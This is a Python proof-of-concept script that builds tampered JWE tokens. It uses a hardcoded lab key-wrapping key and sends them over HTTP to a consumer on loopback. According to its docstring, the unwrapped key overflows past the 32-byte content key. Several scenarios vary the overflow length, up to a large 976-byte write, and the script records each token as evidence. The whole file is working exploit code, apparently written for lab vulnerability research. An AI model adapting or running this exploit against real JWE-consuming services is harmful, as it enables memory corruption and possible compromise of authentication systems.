#!/usr/bin/env python3
"""Send one real HTTP request with a tampered compact JWE to the loopback consumer.

RFC 3394 wrap is implemented here with the same lab KEK as the pinned harness
so the unwrap succeeds and writes chosen bytes past the 32-byte CEK.
"""
import base64
import os
import socket
import struct
import sys

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

KEK = bytes.fromhex("dfddb556b3b94eb2ef3d0f8d14b96085")
A6 = b"\xa6" * 8


def b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def wrap(plaintext):
    assert len(plaintext) % 8 == 0 and len(plaintext) >= 16
    n = len(plaintext) // 8
    a = A6
    r = [plaintext[i * 8:(i + 1) * 8] for i in range(n)]
    cipher = Cipher(algorithms.AES(KEK), modes.ECB()).encryptor()
    for j in range(6):
        for i in range(1, n + 1):
            block = cipher.update(a + r[i - 1])
            a = bytes(x ^ y for x, y in zip(block[:8], struct.pack(">Q", n * j + i)))
            r[i - 1] = block[8:]
    return a + b"".join(r)


def token_for(scenario):
    if scenario == "valid":
        ek = wrap(b"\x5a" * 32)
    elif scenario == "wrapped":
        ek = wrap(b"\x5a" * 32 + b"MISHE-OO")
    elif scenario.startswith("wrappedN"):
        n = int(scenario[len("wrappedN"):])
        if n < 40 or n % 8:
            raise SystemExit("BAD_WRITE_LEN=" + str(n))
        ek = wrap(b"\x5a" * 32 + b"MISHE-OO" + b"\x5a" * (n - 40))
    elif scenario == "wrappedbig":
        ek = wrap(b"\x5a" * 32 + b"MISHE-OO" + b"\x00" * 976)
    elif scenario == "probe":
        ek = b"A" * 48
    elif scenario == "undersized":
        ek = b"A" * 32
    else:
        raise SystemExit("BAD_SCENARIO=" + scenario)
    header = b64u(b'{"alg":"A128KW","enc":"A128CBC-HS256"}')
    iv = b64u(os.urandom(16))
    ciphertext = b64u(b"\x11" * 48)
    tag = b64u(b"\x22" * 32)
    return ".".join((header, b64u(ek), iv, ciphertext, tag))


def main():
    host, port, scenario = sys.argv[1], int(sys.argv[2]), sys.argv[3]
    token = token_for(scenario)
    with open(os.path.join(os.path.dirname(__file__), "evidence",
                           "token-" + scenario + ".txt"), "w") as f:
        f.write(token + "\n")
    req = ("GET /verify HTTP/1.1\r\nHost: " + host + "\r\n"
           "Authorization: Bearer " + token + "\r\n"
           "User-Agent: w181-loopback-consumer\r\n"
           "Connection: close\r\n\r\n").encode("ascii")
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(req)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    print("SCENARIO=" + scenario, "TOKEN_LEN=" + str(len(token)))
    print("RESPONSE=" + repr(b"".join(chunks)[:120]))


if __name__ == "__main__":
    main()
